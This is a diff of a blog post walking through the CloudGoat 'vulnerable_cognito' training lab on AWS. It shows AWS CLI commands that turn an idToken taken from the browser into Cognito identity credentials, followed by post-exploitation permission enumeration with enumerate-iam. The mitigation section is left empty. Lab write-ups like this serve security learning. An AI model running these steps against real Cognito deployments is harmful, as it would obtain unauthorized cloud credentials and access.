@@ -19,6 +19,14 @@ ii. You need to :\
 &nbsp;&nbsp;&nbsp;&nbsp;1. ***To Elevate your privileges***\
 &nbsp;&nbsp;&nbsp;&nbsp;2. ***and get Cognito Identity Pool credentials***
 
+iii. Scenario Resources: \
+&nbsp;&nbsp;&nbsp;&nbsp;1 S3 bucket \
+&nbsp;&nbsp;&nbsp;&nbsp;1 Cognito Userpool \
+&nbsp;&nbsp;&nbsp;&nbsp;1 Cognito IdentityPool \
+&nbsp;&nbsp;&nbsp;&nbsp;1 API Gateway REST API \
+&nbsp;&nbsp;&nbsp;&nbsp;1 Lambda \
+&nbsp;&nbsp;&nbsp;&nbsp;1 IAM role
+
 I will be using Kali Linux VM to Spin Up the Vulnerable Lab Setup.
 
 ### CloudGoat SetUp:
@@ -188,6 +196,76 @@ Let's check the Source again now for admin account (_admin.html_):
 
 ```bash
 IdentityPoolId: us-east-1:020af0e2-d0e0-46cd-9602-346d98689753
+another value within Logins (not any particular keyword, just made that up for convinience) : cognito-idp.us-east-1.amazonaws.com/us-east-1_mYaVxhwr7 (cognito-idp.{region}.amazonaws.com/{UserPoolId}) 
 ```
 
+#### Now let's retrieve, _`IdentityId`_:
+
+> `IdentityPoolId` + `UserPoolId` + `idToken` (we previously retrieved from Local Storage of Browser) = `IdentityId`
+
+Previously when we checked the Source Code of the _reader.html_ site : \
+```bash
+UserPoolId: 'us-east-1_mYaVxhwr7'
+ClientId: '4u4i11pmknfa2k6flrur6c3a5v'
+```
+
+_`Another value within Logins`_ can be used directly to construct the AWS CLI command to retrieve, _`IdentityId`_:
+
+```bash
+aws cognito-identity get-id --identity-pool-id '[IdentityPool_Id]' --logins "another value within Logins={idToken}" --region [region] 
+```
+Or,
+```bash
+aws cognito-identity get-id --identity-pool-id '[IdentityPool_Id]' --logins "cognito-idp.{region}.amazonaws.com/{UserPoolId}={idToken}" --region [region] 
+```
+
+![image](https://github.com/reveng007/blog/assets/61424547/9b1064ef-8395-4b11-8fd6-dcf876c701c9)
+
+```bash
+IdentityId : us-east-1:b41e526f-7f65-47c3-bf18-38fd17f2192a
+```
+
+#### Retrieving AWS credentials from IdentityId :
+
+> `IdentityId` + `UserPoolId` + `idToken` (we previously retrieved from Local Storage of Browser) = AWS credentials!!!
+
+```bash
+aws cognito-identity get-credentials-for-identity --identity-id '{IdentityId}' --logins "another value within Logins={idToken}" --region [region] 
+```
+Or,
+```bash
+aws cognito-identity get-credentials-for-identity --identity-id '{IdentityId}' --logins "cognito-idp.{region}.amazonaws.com/{UserPoolId}={idToken}" --region [region] 
+```
+
+![image](https://github.com/reveng007/blog/assets/61424547/4f2d7c16-e17c-460b-9979-666351797f00)
+
+
+#### Post Exp Using [enumerate-iam](https://github.com/andresriancho/enumerate-iam):
+
+```bash
+enumerate-iam.py --access-key [retrieved AccessKeyId] --secret-key [SecretKey] --session-token [SessionToken] --region [region]
+```
+
+![image](https://github.com/reveng007/blog/assets/61424547/48956b41-6ea1-4de8-bad4-f8cb032d06d0)
+
+
+### Security Mitigation for the above Misconfigurations:
+
+
+### BTW, Destroy the scenario after completion of this lab:
+```bash
+./cloudgoat.py destroy vulnerable_cognito
+```
+
+### New KeyWords We learnt (Can be used as Keyword Searching (Ctrl+F) if needed anytime):
+1. Amazon Cognito
+2. cognito-idp
+3. post-confirmation lambda trigger
+4. custom attribute “custom:access”
+5. Role-based access control
+6. IAM Role
+7. another value within Logins
+
+
+With this, I have come to the end of the blog. I will be uploading the rest of the CloudGoat Scenarios as soon as I finish them covering myself in lab env. If you guys/gals have any query, you can reach me at any of my social media. Till then, see yaa!
 
